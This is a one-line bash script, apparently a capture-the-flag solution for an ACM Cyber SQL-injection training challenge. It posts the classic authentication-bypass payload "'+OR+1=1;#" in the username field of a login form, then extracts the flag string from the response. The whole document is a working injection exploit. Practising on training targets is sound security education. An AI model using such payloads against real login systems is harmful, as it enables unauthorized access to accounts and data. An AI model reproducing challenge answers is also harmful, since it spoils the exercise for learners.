#!/bin/bash

curl -s -X POST https://sql-prevention-101.acmcyber.com/ --data "username='+OR+1=1;#&password=a" | grep flag | sed 's/.*\(flag{.*}\).*/\1/'
